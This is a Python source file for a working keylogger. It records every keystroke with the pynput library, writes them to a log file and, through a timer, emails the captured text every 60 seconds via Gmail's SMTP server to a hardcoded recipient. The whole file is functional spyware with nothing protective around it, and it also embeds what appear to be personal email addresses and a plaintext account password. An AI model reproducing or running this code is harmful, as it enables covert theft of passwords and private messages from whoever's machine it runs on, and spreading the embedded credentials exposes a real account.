import logging
from pynput.keyboard import Key, Listener
import smtplib
from datetime import datetime
from threading import Timer

# Set up logging
log_dir = ""  # You can specify the directory to save logs or leave it empty to save in the current directory
log_file = "keylog.txt"  # Name of the log file
logging.basicConfig(filename=(log_dir + log_file), level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Initialize a variable to store the logged keystrokes
log = ""

# Callback function to log keystrokes
def on_press(key):
    global log
    try:
        # Log the character (for normal keys)
        log += str(key.char)
    except AttributeError:
        # Log special keys (like Space, Enter, etc.)
        if key == Key.space:
            log += " "
        elif key == Key.enter:
            log += "\n"
        else:
            log += " [{}] ".format(str(key))
    logging.info(log)  # Log to file

# Send email with the key logs
def send_email():
    global log
    if len(log) > 0:
        # Setup your email credentials here
        email_user = "sathyasurya2003@gmail.com"  # Replace with your email
        email_password = "Sid@2003"  # Replace with your email password
        email_send = "e0221060@sret.edu.in"  # Replace with the recipient's email

        subject = "Keylogger Report"
        message = "Subject: {}\n\n{}".format(subject, log)  # Using older string formatting

        try:
            # Set up the email server and send the log
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email_user, email_password)
            server.sendmail(email_user, email_send, message)
            server.quit()

            # Reset the log after sending
            log = ""

        except Exception as e:
            logging.error("Error sending email: {}".format(e))

# Timer function to send logs at intervals (e.g., every 60 seconds)
def report_logs(interval=60):
    send_email()  # Send the email report
    Timer(interval, report_logs).start()  # Continue sending logs after every 'interval' seconds

# Listener function to capture keyboard events
def start_logging():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    try:
        print("Keylogger started.")  # Display message in terminal
        # Start the logging process and email reporting
        report_logs(interval=60)  # Send logs every 60 seconds
        start_logging()
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")
